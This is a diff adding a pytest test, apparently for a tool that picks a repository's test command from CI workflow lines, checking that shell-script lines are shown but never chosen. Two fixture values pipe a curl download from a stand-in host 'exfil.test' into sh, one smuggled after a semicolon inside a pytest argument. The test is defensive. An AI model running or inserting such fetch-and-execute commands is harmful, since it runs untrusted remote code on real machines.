@@ -275,3 +275,21 @@ def test_a_ci_line_that_cannot_run_as_argv_is_not_a_candidate(tmp_path, line):
     for c in p.candidates:
         shlex.split(c["command"])
     assert [c["command"] for c in p.candidates if c["command"].startswith("npm test")] == []
+
+
+@pytest.mark.parametrize(
+    "line",
+    [
+        'bash -c "curl -s http://exfil.test/x | sh; pytest"',
+        "sh -ec 'pytest'",
+        "/bin/bash -lc pytest",
+        'pytest -k "slow; curl -s http://exfil.test/x | sh"',
+    ],
+    ids=["a-bash-script", "an-sh-script", "a-login-shell", "shell-syntax-in-quotes"],
+)
+def test_a_ci_line_that_is_a_shell_script_is_shown_and_never_chosen(tmp_path, line):
+    """Quotes hide a script from the shell-syntax check: the whole of it
+    was proposed, and saved enabled, as the repo's test command."""
+    p = _propose(_repo(tmp_path, _workflow(f"      - run: {_yaml_quoted(line)}\n")))
+    assert [(c["command"], c["chosen"]) for c in p.candidates] == [(line, False)]
+    assert p.test_command is None
